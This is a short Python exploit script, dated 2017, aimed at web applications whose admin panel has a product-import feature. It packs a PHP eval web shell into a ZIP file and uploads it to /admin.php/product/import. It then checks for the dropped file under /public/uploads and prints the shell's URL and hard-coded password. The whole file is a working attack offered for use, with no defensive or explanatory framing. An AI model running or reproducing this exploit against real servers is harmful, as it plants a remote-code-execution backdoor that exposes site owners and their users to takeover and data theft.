#!/usr/bin/dev python
# -*- coding:utf-8 -*-
# author: Lion Ei'Jonson
# date:2017/9/30

import sys
import requests
import zipfile
import os

def usage():
	print("[*]Useage: python %s http://www.lioneijonson.cn" % sys.argv[0])

def make_zip():
	payload = "<?php @eval($_POST['Li0nE1Jon5on']);?>"
	fp = open('leesun.csv','w+')
	for i in range(0,4):
		for i in range(0,17):
			fp.write('test,')
		fp.write('conf1g.php,\n')
	fp.close()
	fp = open('conf1g.php','w')
	fp.write(payload)
	fp.close()
	z = zipfile.ZipFile('leesun.zip','w')
	z.write("leesun.csv")
	z.write("conf1g.php")
	z.close()
	if zipfile.is_zipfile('leesun.zip'):
		return True
	else:
		print("[!]make zip file false")
		sys.exit()

def upload_file(url):
	header = {'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0','Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}
	files = {"cate":(None,"44"),"zip_file":('leesun.zip',open("leesun.zip",'rb'))}
	try:
		requests.post(url,headers=header,files=files)
	except:
		print("[!]Target is not available")
		sys.exit()

def check_file(site):
	target = site + "/public/uploads/conf1g.php"
	response = requests.get(target)
	if response.status_code == 200:
		return True
	else:
		print("[!]Target is not vulnerable")
		sys.exit();

def remove_zip():
	os.remove('conf1g.php')
	os.remove('leesun.csv')
	os.remove('leesun.zip')

if __name__ == '__main__':
	if len(sys.argv) != 2:
		usage()
		sys.exit()
	if(sys.argv[1][:4]) != "http":
		site = "http://" + sys.argv[1]
	else:
		site = sys.argv[1]
	url = site + "/admin.php/product/import"
	if make_zip():
		upload_file(url)
	if check_file(site):
		print("[*]Target is vulnerable")
		print("[*]shell:%s/public/uploads/conf1g.php" % site)
		print("[*]password:Li0nE1Jon5on")
	remove_zip()